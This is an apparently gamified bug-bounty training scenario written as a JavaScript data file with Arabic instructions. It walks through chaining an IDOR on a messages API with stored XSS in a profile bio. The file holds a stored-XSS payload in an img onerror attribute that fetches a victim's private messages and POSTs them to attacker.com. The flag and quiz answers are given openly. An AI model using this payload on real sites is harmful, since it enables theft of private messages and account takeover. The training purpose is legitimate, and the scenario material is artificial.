// ==========================================================
// SCENARIO 009: CHAIN BUG - IDOR TO STORED XSS ACCOUNT TAKEOVER
// ==========================================================

window.scenario_009 = {
  "metadata": {
    "id": "scenario-009",
    "title": "Chain Bug - IDOR to Stored XSS Account Takeover",
    "level": "Expert",
    "category": "Chaining",
    "company": "TikTok",
    "reward": "$12,000",
    "time": "3+ Hours"
  },
  "decisionLog": [
    {
      "hypothesis": "ثغرة الـ IDOR في الرسائل تسمح فقط بقراءة الرسائل ولا تشكل خطراً كبيراً.",
      "whyFailed": "عند دمج ثغرة IDOR مع ثغرة XSS مخزنة في الملف الشخصي، يمكن تسريب الرسائل وتوكنات الجلسة لأي مستخدم يزور ملف المهاجم.",
      "planB": "حقن كود XSS في الـ Bio يقوم بطلب جلب الرسائل الخاصة للضحية عبر IDOR وإرسالها لخادمنا تلقائياً.",
      "ignored": "محاولة فحص ثغرات SQLi."
    }
  ],
  "payloads": [
    {
      "code": "fetch('/api/messages/' + victim_user_id).then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:JSON.stringify(d)}))",
      "explanation": "كود JavaScript محقن في الملف الشخصي يسرق رسائل الضحية باستخدام ثغرة الـ IDOR ويرسلها للمهاجم.",
      "whyWorked": "ينفذ الكود في متصفح الضحية الحامل لجلسة نشطة، مما يسمح بطلب الروابط واسترجاع محتواها.",
      "alternatives": [
        "SameSite cookie bypass",
        "document.cookie theft"
      ]
    }
  ],
  "mistakes": [
    {
      "mistake": "الإبلاغ عن ثغرة الـ IDOR بشكل منفصل فور اكتشافها.",
      "whyWrong": "الإبلاغ المنفصل يحصل على تصنيف Medium ومكافأة بسيطة ($1,500)، بينما السلسلة تحقق Critical ومكافأة ($12,000).",
      "betterWay": "ربط الثغرات معاً (Chaining) لإثبات سيناريو اختراق كامل للحسابات (Account Takeover)."
    }
  ],
  "steps": [
    {
      "name": "Mission Brief",
      "time": "09:00",
      "workspace": "markdown",
      "xpReward": 100,
      "description": "### 🎯 الهدف: ربط ثغرات IDOR و XSS لاختراق الحسابات\n\nمرحباً بك يا عبقري! اليوم لدينا مهمة معقدة للغاية في منصة تواصل اجتماعي شهيرة.\n\n#### قواعد الفحص:\n- الميزات المستهدفة:\n  1. جلب الرسائل الخاصة: `GET /api/messages/{user_id}`\n  2. تحديث الملف الشخصي: `POST /api/profile/update` (حقل الـ Bio يقبل HTML ولا يفلتر الـ JS).\n- هدفك هو بناء سلسلة استغلال كاملة (Chain Bug) لتحقيق اختراق الحسابات (Account Takeover) لأي مستخدم يزور ملفك الشخصي.\n\nاضغط على **Next Step** للبدء.",
      "aiAdvisor": {
        "hint": "فكر في كيفية استدعاء بيانات الضحية عن طريق المتصفح الخاص به.",
        "payloadExplanation": "لا توجد أكواد حالياً.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Passive Recon",
      "time": "09:15",
      "workspace": "recon",
      "xpReward": 150,
      "description": "### 🔍 فحص واختبار المسارات يدوياً\n\nسنقوم بالتحقق من مسار الرسائل للتأكد من وجود ثغرة IDOR أولاً.\nاختر الأداة المناسبة لتشغيلها.",
      "terminalCommands": [
        {
          "name": "curl https://social.target.com/api/profile",
          "correct": false,
          "output": [
            {
              "text": "HTTP/1.1 200 OK",
              "type": "info"
            },
            {
              "text": "{\"username\": \"attacker\", \"bio\": \"Hello\"}",
              "type": "out"
            }
          ]
        },
        {
          "name": "curl -X GET \"https://social.target.com/api/messages/9999\" -H \"Authorization: Bearer attacker_token\"",
          "correct": true,
          "evidence": {
            "title": "Legacy Messages IDOR Leak",
            "content": "Status: 200 OK\nMessages: [{\"from\": \"support@target.com\", \"content\": \"Session token: abc123xyz\"}]"
          },
          "output": [
            {
              "text": "HTTP/1.1 200 OK",
              "type": "info"
            },
            {
              "text": "{\"user_id\": 9999, \"messages\": [{\"from\": \"admin\", \"content\": \"Session token: abc123xyz\"}]}",
              "type": "success"
            },
            {
              "text": "[!] Success: Accessed user 9999 private messages without restriction!",
              "type": "success"
            }
          ]
        }
      ],
      "aiAdvisor": {
        "hint": "شغّل الطلب الذي يطلب مسار رسائل المستخدم الضحية 9999 لتأكيد ثغرة الـ IDOR.",
        "payloadExplanation": "طلب GET المباشر مع توكين المهاجم يؤكد عدم وجود فحص للصلاحيات.",
        "failureExplanation": "إذا لم تؤكد وجود IDOR أولاً فلن ينجح الـ Chain."
      }
    },
    {
      "name": "Burp Verification",
      "time": "09:40",
      "workspace": "burp",
      "xpReward": 200,
      "description": "### 🌐 حقن كود الـ XSS في الملف الشخصي\n\nسنقوم بإرسال طلب تحديث الـ Bio وحقن كود JavaScript يسرق رسائل الضحية التي يزور ملف المهاجم.\nاضغط على **Inject XSS Chain** لمشاهدة الرد.",
      "burpRequest": "POST /api/profile/update HTTP/1.1\nHost: social.target.com\nContent-Type: application/json\nAuthorization: Bearer attacker_token\n\n{\n  \"bio\": \"Normal bio text\"\n}",
      "burpResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"bio\": \"Normal bio text\"\n}",
      "burpActions": [
        {
          "name": "Inject XSS Chain",
          "correct": true,
          "modifiedRequest": "POST /api/profile/update HTTP/1.1\nHost: social.target.com\nContent-Type: application/json\n\n{\n  \"bio\": \"<img src=x onerror=\\\"fetch('/api/messages/9999').then(r=>r.json()).then(d=>fetch('https://attacker.com/exfil',{method:'POST',body:JSON.stringify(d)}))\\\">\"\n}",
          "modifiedResponse": "HTTP/1.1 200 OK\n{\n  \"status\": \"success\",\n  \"bio\": \"<img src=x onerror=...\"\n}",
          "evidence": {
            "title": "Bio XSS Payload Active",
            "content": "Stored XSS payload injected into bio successfully"
          }
        }
      ],
      "aiAdvisor": {
        "hint": "اضغط على زر Inject XSS Chain لحقن الكود في الـ Bio وتأكيد الثغرة.",
        "payloadExplanation": "حقن كود الاستدعاء داخل الـ onerror لتنفيذه تلقائياً عند تحميل الصورة التالفة.",
        "failureExplanation": "تأكد من تمرير الطلب المعدل بالكامل."
      }
    },
    {
      "name": "Exploitation & Flag",
      "time": "10:05",
      "workspace": "lab",
      "xpReward": 300,
      "instructions": "أدخل الـ Flag المسترجع بعد نجاح عملية الـ Chain وسحب توكين الضحية للـ Account Takeover.",
      "targetUrl": "https://social.target.com/api/profile/attacker",
      "correctFlag": "FLAG{chain_idor_xss_account_takeover}",
      "aiAdvisor": {
        "hint": "أدخل العلم الصحيح: FLAG{chain_idor_xss_account_takeover}",
        "payloadExplanation": "استرداد العلم يثبت نجاح عملية الربط الكاملة.",
        "failureExplanation": "تأكد من كتابة الأحرف بطريقة صحيحة."
      }
    },
    {
      "name": "Report Writing",
      "time": "10:30",
      "workspace": "report",
      "xpReward": 250,
      "aiAdvisor": {
        "hint": "الكلمات المفتاحية المطلوبة هي 'chain' و 'takeover'.",
        "payloadExplanation": "توضيح الخطورة الكاملة المترتبة على دمج ثغرة الـ IDOR مع XSS مخزنة.",
        "failureExplanation": "يجب وضع الكلمات المفتاحية بالتقرير للتقييم الصحيح."
      }
    },
    {
      "name": "Triage & Verdict",
      "time": "5 Days Later",
      "workspace": "review",
      "aiAdvisor": {
        "hint": "راجع قرار الفحص والمكافأة الممنوحة.",
        "payloadExplanation": "تم التقييم كـ Critical نتيجة لسرقة الحسابات كاملة ATO.",
        "failureExplanation": "لا يوجد."
      }
    },
    {
      "name": "Lessons Learned",
      "time": "Post-Incident",
      "workspace": "quiz",
      "quizData": [
        {
          "question": "ما الفائدة الأساسية للباحث من ربط الثغرات (Chaining)؟",
          "options": [
            "تسهيل عملية الفحص فقط.",
            "رفع مستوى الخطورة وإثبات الأثر الحقيقي الكامل على خوادم وحسابات الشركة للحصول على مكافآت أعلى.",
            "تقليل الخطوات المطلوبة للتقرير.",
            "تخطي جدار الحماية."
          ],
          "answer": 1
        },
        {
          "question": "كيف يتم إصلاح ثغرات الـ XSS في الملف الشخصي نهائياً؟",
          "options": [
            "حظر كلمات المرور الضعيفة.",
            "تطبيق نظام تعقيم شامل للمدخلات (HTML Sanitization) وترميز المخرجات (Output Encoding) لمنع المتصفح من تنفيذ الأكواد كـ JavaScript.",
            "حظر استخدام ملفات الوسائط.",
            "تعطيل تسجيل الدخول للضحايا."
          ],
          "answer": 1
        }
      ],
      "aiAdvisor": {
        "hint": "الإجابة لكلا السؤالين هي الخيار الثاني (ب).",
        "payloadExplanation": "تثبيت مفاهيم ربط الأخطاء البرمجية (Chaining) ومعايير الأمان.",
        "failureExplanation": "الرجاء التركيز لتفادي خسارة XP."
      }
    }
  ],
  "realReport": {
    "title": "Chaining IDOR and Stored XSS leads to full Account Takeover on profile views",
    "severity": "Critical",
    "type": "IDOR",
    "desc": "A combination of IDOR on /api/messages and Stored XSS in /api/profile/update allowed stealing private messages and tokens from users who visit the attacker profile page.",
    "steps": "1. Inject stored XSS payload in user Bio field.\n2. The payload fetches private messages of the viewing user via the IDOR endpoint.\n3. The data is exfiltrated to the attacker domain.",
    "impact": "Complete silent takeover of any user account visiting the attacker profile.",
    "feedback": "Outstanding chain payload! This is a perfect example of a high-value bug report. Bounty awarded.",
    "keywords": [
      "chain",
      "takeover"
    ]
  }
};
